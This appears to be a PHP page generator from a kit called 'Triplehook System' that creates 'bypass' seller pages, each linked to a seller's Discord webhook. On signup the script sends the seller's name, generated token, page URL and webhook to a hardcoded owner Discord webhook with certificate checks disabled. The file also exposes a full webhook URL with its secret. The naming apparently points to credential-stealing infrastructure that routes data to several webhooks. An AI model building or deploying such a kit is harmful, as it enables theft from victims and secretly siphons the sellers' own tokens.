<?php
// create.php - System for creating new seller pages
$sellers_file = 'sellers.json';
const OWNER_WEBHOOK = "https://discord.com/api/webhooks/1457023827522621574/QQLHW0EUVMlmZrneF9YXpHsh-_8k6gjMqCPcLoF8eTcMlEP47w2s4r1tVYqGTRbL-cm5";
const ADMIN_WEBHOOK = "https://discord.com/api/webhooks/1457023827522621574/QQLHW0EUVMlmZrneF9YXpHsh-_8k6gjMqCPcLoF8eTcMlEP47w2s4r1tVYqGTRbL-cm5"; // Bisa disamakan atau beda

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = preg_replace("/[^a-zA-Z0-9]/", "", $_POST['username']);
    $webhook = trim($_POST['webhook']);
    
    if (empty($username) || empty($webhook)) {
        die(json_encode(['success' => false, 'message' => 'Data tidak lengkap.']));
    }

    $sellers = [];
    if (file_exists($sellers_file)) {
        $sellers = json_decode(file_get_contents($sellers_file), true) ?: [];
    }

    if (isset($sellers[$username])) {
        die(json_encode(['success' => false, 'message' => 'Username sudah terpakai.']));
    }

    $token = bin2hex(random_bytes(16));
    $sellers[$username] = [
        'webhook' => $webhook,
        'token' => $token,
        'created_at' => date('Y-m-d H:i:s')
    ];

    file_put_contents($sellers_file, json_encode($sellers, JSON_PRETTY_PRINT));

    // Send Notification to Owner Discord
    $domain = $_SERVER['HTTP_HOST'];
    $page_url = "http://$domain/bypass/$username";
    
    $payload = json_encode([
        "content" => "@everyone **New Seller Created!**",
        "embeds" => [[
            "title" => "🟢 NEW SELLER PAGE GENERATED",
            "color" => 65280,
            "fields" => [
                ["name" => "👤 Seller Name", "value" => "```$username```", "inline" => true],
                ["name" => "🔑 Access Token", "value" => "```$token```", "inline" => true],
                ["name" => "🔗 Page URL", "value" => "[Click to View]($page_url)", "inline" => false],
                ["name" => "⚓ Seller Webhook", "value" => "|| $webhook ||", "inline" => false]
            ],
            "footer" => ["text" => "Triplehook System V.1"]
        ]]
    ]);

    $ch = curl_init(OWNER_WEBHOOK);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    curl_close($ch);

    echo json_encode(['success' => true, 'url' => $page_url, 'token' => $token]);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CREATE BYPASS PAGE</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #00ff41; --bg: #0a0a0a; }
        body { background: var(--bg); color: var(--primary); font-family: 'JetBrains Mono', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: rgba(0, 20, 0, 0.9); border: 1px solid var(--primary); padding: 30px; border-radius: 8px; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); width: 400px; }
        h2 { text-align: center; border-bottom: 1px solid var(--primary); padding-bottom: 10px; }
        input { width: 100%; padding: 10px; background: #000; border: 1px solid #003b00; color: var(--primary); margin: 10px 0; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: var(--primary); border: none; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:hover { background: #008f11; box-shadow: 0 0 15px var(--primary); }
    </style>
</head>
<body>
    <div class="card">
        <h2>GENERATE PAGE</h2>
        <form id="createForm">
            <input type="text" name="username" placeholder="SELLER NAME (ex: pongoseller)" required>
            <input type="url" name="webhook" placeholder="DISCORD WEBHOOK URL" required>
            <button type="submit">GENERATE LINK</button>
        </form>
        <div id="result" style="margin-top:20px; display:none; word-break:break-all; font-size:12px; padding:10px; border:1px dashed var(--primary);"></div>
    </div>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        $('#createForm').on('submit', function(e) {
            e.preventDefault();
            $.post('create.php', $(this).serialize(), function(res) {
                const data = JSON.parse(res);
                if(data.success) {
                    $('#result').html('SUCCESS!<br>URL: ' + data.url + '<br>TOKEN: ' + data.token).fadeIn();
                } else {
                    alert(data.message);
                }
            });
        });
    </script>
</body>
</html>
